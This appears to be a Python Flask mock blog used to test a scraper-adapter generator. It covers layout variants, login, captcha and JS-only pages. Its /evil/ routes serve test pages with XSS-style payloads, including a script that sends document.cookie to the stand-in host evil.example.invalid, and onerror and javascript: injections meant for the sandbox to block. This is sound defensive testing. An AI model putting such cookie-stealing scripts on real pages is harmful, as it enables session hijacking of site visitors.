"""公开静态博客 mock 站点：用于适配器自动生成与适配校验的端到端演练。

站点提供两套列表页结构，模拟「站点小幅改版」：

- ``variant=v1``（默认）：列表容器 ``section.post-list``，文章链接 ``a.post-link``，
  详情标题 ``h1.entry-title``、正文 ``div.entry-content``。
- ``variant=v2``：列表容器换成 ``div.blog-cards``、链接 ``a.card-link``，
  详情标题换成 ``h2.headline``、正文换成 ``section.article-body``（结构小幅调整）。

另有四类特殊场景路由，用于能力边界与安全演练：

- ``/login-required/*``：页面要求登录，自动生成必须明确报「不支持」。
- ``/captcha/*``：带验证码表单，自动生成必须明确报「不支持」。
- ``/js-only/*``：内容只由 JavaScript 渲染，未显式开启动态渲染时报「不支持」。
- ``/evil/*``：详情页内嵌恶意脚本（``<script>`` / 内联事件 / ``javascript:``），
  沙箱校验必须拦截且不得在本地产生任何代码执行。

变体切换方式：创建 app 时传 ``default_variant``，或请求时带 ``?variant=v2``，
也可在测试中直接改写 ``app.config["BLOG_VARIANT"]`` 模拟站点改版。
"""

from __future__ import annotations

import os
from typing import Any

from flask import Flask, Response, request

from mock_site.blog.posts_data import PAGE_SIZE, POSTS

HTML_CONTENT_TYPE = "text/html; charset=utf-8"


def create_app(default_variant: str = "v1") -> Flask:
    """创建博客 mock Flask 应用。"""

    app = Flask(__name__)
    app.config["BLOG_VARIANT"] = default_variant

    def variant() -> str:
        forced = request.args.get("variant")
        if forced in {"v1", "v2"}:
            return forced
        configured = app.config.get("BLOG_VARIANT", "v1")
        return configured if configured in {"v1", "v2"} else "v1"

    # ---------- 正常博客 ----------

    @app.get("/")
    def index() -> Response:
        return Response(render_index(variant()), content_type=HTML_CONTENT_TYPE)

    @app.get("/posts")
    def post_list() -> Response:
        page = _positive_int("page", 1)
        return Response(render_list(page, variant()), content_type=HTML_CONTENT_TYPE)

    @app.get("/posts/<slug>")
    def post_detail(slug: str) -> Response:
        post = _find_post(slug)
        if post is None:
            return Response("not found", status=404)
        return Response(render_detail(post, variant()), content_type=HTML_CONTENT_TYPE)

    # ---------- 能力边界场景 ----------

    @app.get("/login-required/posts")
    def login_list() -> Response:
        html = """<!doctype html><html lang="zh-CN"><head><meta charset="utf-8">
<title>登录后可见</title></head><body>
<h1>用户登录</h1>
<form method="post" action="/login">
  <input type="text" name="username" placeholder="用户名">
  <input type="password" name="password" placeholder="密码">
  <button type="submit">登录</button>
</form></body></html>"""
        return Response(html, content_type=HTML_CONTENT_TYPE)

    @app.get("/captcha/posts")
    def captcha_list() -> Response:
        html = """<!doctype html><html lang="zh-CN"><head><meta charset="utf-8">
<title>安全验证</title></head><body>
<h1>验证码校验</h1>
<form method="post" action="/verify">
  <input type="text" name="captcha" placeholder="请输入图中验证码">
  <img src="/captcha.png" alt="captcha 验证码">
  <button type="submit">提交</button>
</form></body></html>"""
        return Response(html, content_type=HTML_CONTENT_TYPE)

    @app.get("/js-only/posts")
    def js_only_list() -> Response:
        # 静态 HTML 里没有任何文章条目，数据只在浏览器端由 JS 注入。
        html = """<!doctype html><html lang="zh-CN"><head><meta charset="utf-8">
<title>动态渲染博客</title></head><body>
<div id="app"></div>
<script>
// 模拟前端框架渲染：文章列表只存在于 JS 中
window.__POSTS__ = [
  {slug: 'rendered-by-js', title: '只在浏览器里出现的文章'}
];
document.getElementById('app').innerHTML =
  window.__POSTS__.map(function (p) {
    return '<a class="js-post" href="/js-only/posts/' + p.slug + '">' + p.title + '</a>';
  }).join('');
</script></body></html>"""
        return Response(html, content_type=HTML_CONTENT_TYPE)

    @app.get("/js-only/posts/<slug>")
    def js_only_detail(slug: str) -> Response:
        html = """<!doctype html><html lang="zh-CN"><head><meta charset="utf-8">
<title>动态详情</title></head><body>
<div id="app"></div>
<script>
document.getElementById('app').innerHTML =
  '<h1 class="js-title">只在浏览器里出现的文章</h1>' +
  '<div class="js-content">这段正文由 JavaScript 渲染。</div>';
</script></body></html>"""
        return Response(html, content_type=HTML_CONTENT_TYPE)

    # ---------- 恶意内容场景 ----------

    @app.get("/evil/posts")
    def evil_list() -> Response:
        html = """<!doctype html><html lang="zh-CN"><head><meta charset="utf-8">
<title>恶意博客列表</title></head><body>
<section class="post-list">
  <article class="post-card">
    <a class="post-link" href="/evil/posts/evil-1">伪装成正常文章的恶意详情页</a>
  </article>
</section>
<script>fetch('http://evil.example.invalid/steal?c=' + document.cookie)</script>
</body></html>"""
        return Response(html, content_type=HTML_CONTENT_TYPE)

    @app.get("/evil/posts/<slug>")
    def evil_detail(slug: str) -> Response:
        # 同时包含 <script>、内联事件、javascript: 链接与 onerror 注入。
        html = """<!doctype html><html lang="zh-CN"><head><meta charset="utf-8">
<title>恶意文章</title></head><body>
<article>
  <h1 class="entry-title">伪装成正常文章的恶意详情页</h1>
  <div class="entry-content">
    <p>这里是看起来正常的公开正文内容。</p>
    <img src="x" onerror="window.__evil__='onerror fired'">
    <a href="javascript:window.__evil__='javascript-uri fired'">点击有惊喜</a>
  </div>
</article>
<script>window.__evil__ = 'script executed';</script>
</body></html>"""
        return Response(html, content_type=HTML_CONTENT_TYPE)

    return app


# ---------- 渲染：v1 / v2 两套结构 ----------


def render_index(v: str) -> str:
    return f"""<!doctype html><html lang="zh-CN"><head><meta charset="utf-8">
<title>公开静态博客示例</title></head><body>
<header><h1>公开静态博客示例</h1></header>
<p><a href="/posts?page=1">进入文章列表（当前结构 {v}）</a></p>
</body></html>"""


def render_list(page: int, v: str) -> str:
    start = (page - 1) * PAGE_SIZE
    entries = POSTS[start : start + PAGE_SIZE]
    if not entries:
        return _empty_list(v)
    cards: list[str] = []
    for post in entries:
        href = f"/posts/{post['slug']}"
        if v == "v1":
            cards.append(
                f"""  <article class="post-card">
    <a class="post-link" href="{href}">{post['title']}</a>
    <span class="post-date">{post['published_at']}</span>
  </article>"""
            )
        else:
            cards.append(
                f"""  <div class="card-item">
    <a class="card-link" href="{href}">{post['title']}</a>
    <time class="card-time">{post['published_at']}</time>
  </div>"""
            )
    next_link = ""
    if start + PAGE_SIZE < len(POSTS):
        next_link = f'<nav class="pager"><a rel="next" href="/posts?page={page + 1}">下一页</a></nav>'
    if v == "v1":
        container_open, container_close = '<section class="post-list">', "</section>"
    else:
        container_open, container_close = '<div class="blog-cards">', "</div>"
    return f"""<!doctype html><html lang="zh-CN"><head><meta charset="utf-8">
<title>文章列表 - 第 {page} 页</title></head><body>
<header><h1>文章列表</h1></header>
{container_open}
{chr(10).join(cards)}
{container_close}
{next_link}
</body></html>"""


def _empty_list(v: str) -> str:
    if v == "v1":
        container = '<section class="post-list"></section>'
    else:
        container = '<div class="blog-cards"></div>'
    return (
        '<!doctype html><html lang="zh-CN"><head><meta charset="utf-8">'
        f"<title>空列表</title></head><body>{container}</body></html>"
    )


def render_detail(post: dict[str, Any], v: str) -> str:
    paragraphs = "".join(f"<p>{paragraph}</p>" for paragraph in post["body"])
    tags = "".join(f"<li>{tag}</li>" for tag in post["tags"])
    if v == "v1":
        return f"""<!doctype html><html lang="zh-CN"><head><meta charset="utf-8">
<title>{post['title']}</title></head><body>
<article class="entry">
  <h1 class="entry-title">{post['title']}</h1>
  <p class="entry-meta">
    <span class="entry-category">{post['category']}</span>
    <time class="entry-date">{post['published_at']}</time>
  </p>
  <ul class="entry-tags">{tags}</ul>
  <div class="entry-content">{paragraphs}</div>
</article>
</body></html>"""
    return f"""<!doctype html><html lang="zh-CN"><head><meta charset="utf-8">
<title>{post['title']}</title></head><body>
<article class="post">
  <h2 class="headline">{post['title']}</h2>
  <div class="post-meta">
    <span class="cat">{post['category']}</span>
    <time class="pub-time">{post['published_at']}</time>
  </div>
  <ul class="tag-list">{tags}</ul>
  <section class="article-body">{paragraphs}</section>
</article>
</body></html>"""


def _find_post(slug: str) -> dict[str, Any] | None:
    for post in POSTS:
        if post["slug"] == slug:
            return post
    return None


def _positive_int(name: str, default: int) -> int:
    try:
        value = int(request.args.get(name, default))
    except (TypeError, ValueError):
        return default
    return value if value >= 1 else default


def blog_variant_from_env() -> str:
    """供 CLI / 测试从环境变量读取默认变体。"""

    value = os.environ.get("BLOG_VARIANT", "v1")
    return value if value in {"v1", "v2"} else "v1"
